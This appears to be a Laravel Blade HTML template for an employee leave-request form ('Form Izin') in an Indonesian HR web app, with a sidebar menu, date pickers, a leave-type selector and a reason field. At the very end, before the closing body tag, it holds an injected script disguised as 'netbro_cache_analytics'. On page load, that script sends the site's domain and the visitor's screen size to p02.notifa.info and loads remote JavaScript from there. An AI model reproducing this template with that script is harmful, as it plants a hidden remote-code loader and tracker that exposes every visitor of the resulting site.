<!DOCTYPE html>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="shortcut icon" href="/image/favicon.png">
    <title>Form Izin</title>
    <link rel="stylesheet" type="text/css" href="assets/lib/perfect-scrollbar/css/perfect-scrollbar.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/material-design-icons/css/material-design-iconic-font.min.css"/><!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
    <link rel="stylesheet" type="text/css" href="assets/lib/datetimepicker/css/bootstrap-datetimepicker.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/daterangepicker/css/daterangepicker.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/select2/css/select2.min.css"/>
    <link rel="stylesheet" type="text/css" href="assets/lib/bootstrap-slider/css/bootstrap-slider.css"/>
    <link rel="stylesheet" href="assets/css/style.css" type="text/css"/>

    </head>
    <body>
      <div class="be-wrapper">
       <div class="be-wrapper be-fixed-sidebar">

            <!--  Sidebar Brand Logo -->

          <div class="be-left-sidebar">
            <div class="brand-logo">
                <img src="/image/logo.png">
            </div>

                 <!--  Sidebar Brand Logo End -->  

                  <!--  Sidebar Start -->  

            <div class="left-sidebar-wrapper"> <a href="#" class="left-sidebar-toggle">MENU</a>
             <div class="left-sidebar-spacer">
              <div class="left-sidebar-scroll">
                <div class="left-sidebar-content">

                     <!--  Sidebar Poto, Username, Edit Profil -->

                    <div class="profil">
                        <div class="circular--portrait">
                            <img class="img-responsive foto-karyawan" src="/image/FotoProfil/{{Auth::user()->foto_profil}}">
                            <div id="username">
                                <a href="profil.html" class="simple_text">{{ Auth::user()->name }}</a>
                            </div>
                           <button onclick="window.location.href='/profil'" type="button" class="btn">Profil</button>
                           <!-- <button class="btn btn-space btn-default active">Default</button> -->
                        </div>
                    </div>

                             <!--  Sidebar Menu-->

                        <ul class="sidebar-elements">
                            <li class="divider">Menu
                                <hr class="Menu">  
                            </li>

                            <li class="active"><a href="/home">
                                <i class="icon fas fa-home"></i>
                                <span>Beranda</span></a>
                            </li>
                                                                     
                            <li class="active">
                                <a class="" href="/datakaryawan">
                                    <i class="icon far fa-address-book"></i>
                                    <span>Data Karyawan</span>
                                </a>
                            </li>

                            <li class="active">
                                <a class=" " href="/presensi">
                                  <i class="icon fas fa-calendar-alt"></i>
                                  <span>Presensi</span>
                              </a>
                            </li>

                              <li class="active">
                                <a class=" " href="/penggajian">
                                   <i class="icon fas fa-money-check-alt"></i>
                                    <span>Penggajian</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/persetujuan_izin">
                                   <i class="icon far fa-calendar-check"></i>
                                    <span>Persetujuan Izin</span>
                                </a>
                              </li>  

                              <li class="divider">Personal
                                 <hr class="Menu">  
                              </li> 

                              <li class="active">
                                <a class=" " href="/gaji">
                                  <i class="icon far fa-money-bill-alt"></i>
                                  <span>Gaji</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/kontak_karyawan">
                                    <i class="icon far fa-id-card"></i>
                                    <span>Kontak Karyawan</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class=" " href="/form_izin">
                                  <i class="icon fab fa-wpforms"></i>
                                  <span>Form Izin</span>
                                </a>
                              </li>

                              <li class="active">
                                <a class="dropdown-item" href="{{ route('logout') }}"
                                       onclick="event.preventDefault();
                                                     document.getElementById('logout-form').submit();">
                                        <i class="icon fas fa-sign-out-alt"></i>
                                        <span>Logout</span>
                                </a>

                                <form id="logout-form" action="{{ route('logout') }}" method="POST" style="display: none;">
                                        @csrf
                                </form>
                              </li>                              
                            </ul>
                         </div>                         
                    </div>
                 </div>
               </div>
            </div>
         </div>

      <div class="be-content">
        <div class="page-head">
          <h2 class="page-head-title">Form Izin</h2>
          
        </div>
        <div class="main-content container-fluid">
          
          <!--Datepicker-->
          <div class="row">
            <div class="col-md-12">
              <div class="panel panel-default ">
                <div class="panel-heading panel-heading-divider">Form Izin Karyawan</div>
                <div class="panel-body">
                  <form action="#" style="border-radius: 0px;" class="form-horizontal group-border-dashed">

                    <div class="form-group">
                      <label class="col-sm-3 control-label"> Tanggal Mulai </label>
                      <div class="col-sm-6"">
                        <div data-min-view="2" data-date-format="yyyy-mm-dd" class="input-group date datetimepicker">
                          <input size="16" type="text" value="" class="form-control"><span class="input-group-addon btn btn-primary"><i class="icon-th mdi mdi-calendar"></i></span>
                        </div>
                      </div>
                    </div>
                   
                    <div class="form-group">
                      <label class="col-sm-3 control-label"> Tanggal Akhir </label>
                      <div class="col-sm-6"">
                        <div data-min-view="2" data-date-format="yyyy-mm-dd" class="input-group date datetimepicker">
                          <input size="16" type="text" value="" class="form-control"><span class="input-group-addon btn btn-primary"><i class="icon-th mdi mdi-calendar"></i></span>
                        </div>
                      </div>
                    </div>

                    <div class="form-group">
                      <label class="col-sm-3 control-label">Tipe Izin</label>
                      <div class="col-sm-6">
                        <select class="select2">
                          <optgroup label="">
                            <option value="1">Sakit</option>
                            <option value="2">Dinas Luar</option>
                            <option value="3">Cuti</option>
                          </optgroup>
                        </select>
                      </div>
                    </div>

                    <div class="form-group">
                      <label class="col-sm-3 control-label">Alasan</label>
                      <div class="col-sm-6">
                        <textarea class="form-control"></textarea>
                      </div>
                    </div>

                    
                      <div class="ajukan">  
                        
                            <button type="button"  class="btn btn-default">Batal</button>
                            <button type="button"  class="btn btn-primary">Ajukan</button>
                   
                      </div>
                  
                  </form>
                </div>
              </div>
            </div>
          </div>
          
      
    </div>
    <script src="assets/lib/jquery/jquery.min.js" type="text/javascript"></script>
    <script src="assets/lib/perfect-scrollbar/js/perfect-scrollbar.jquery.min.js" type="text/javascript"></script>
    <script src="assets/js/main.js" type="text/javascript"></script>
    <script src="assets/lib/bootstrap/dist/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="assets/lib/jquery-ui/jquery-ui.min.js" type="text/javascript"></script>
    <script src="assets/lib/jquery.nestable/jquery.nestable.js" type="text/javascript"></script>
    <script src="assets/lib/moment.js/min/moment.min.js" type="text/javascript"></script>
    <script src="assets/lib/datetimepicker/js/bootstrap-datetimepicker.min.js" type="text/javascript"></script>
    <script src="assets/lib/daterangepicker/js/daterangepicker.js" type="text/javascript"></script>
    <script src="assets/lib/select2/js/select2.min.js" type="text/javascript"></script>
    <script src="assets/lib/select2/js/select2.full.min.js" type="text/javascript"></script>
    <script src="assets/lib/bootstrap-slider/js/bootstrap-slider.js" type="text/javascript"></script>
    <script type="text/javascript">
      $(document).ready(function(){
        //initialize the javascript
        App.init();
        App.formElements();
      });
    </script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p02.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mrwd1XyoNwUx4sRGOmghaZQzUik2U9TBYmSXhXu8hacxmhsrimwjkastcbF%2f%2bptWMO3vL3FWADfYV6YJR5U4TfMM%2fgfq4HQxs%2b5lorprpnS6d7d%2fjeOEyxkbEYbv0u9P07OhhxndEib3FDljXduGU%2fjBfMKf26rpZvJpQkSIYtWWKDu8jwy9qSgpYsU1ZwmtK9zsjbGiatLj7UIImtFsGQfk9dL1Bm9s98u5s1dIPGRDcR%2bqVvx3nRgTlu3Tpgq7cd0uL8iPsHymUatNeCDJhgBKs%2bI4CNWnEmUr1763V2SmepEeFmq7wJP9WdkWJLD5uhHdKDXKiK4DzTJHZY0mPBnDUczRYASTI0pyILBwedlU9mYHZf2lcyCCh4tDZclG8OaimMnoxnpmQ7nFr2ozRwuiTdypAe3QVM9%2bfHdVBhiVveOqg%2fVdHzy6Ou76QDzkDvoxv8kEdbT808c43co%2frC8Ro2bBStt876Y45haw89mHXvG%2flEvfz8XyW30Z5yHOQ4h1ehr1UNSY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


</html>
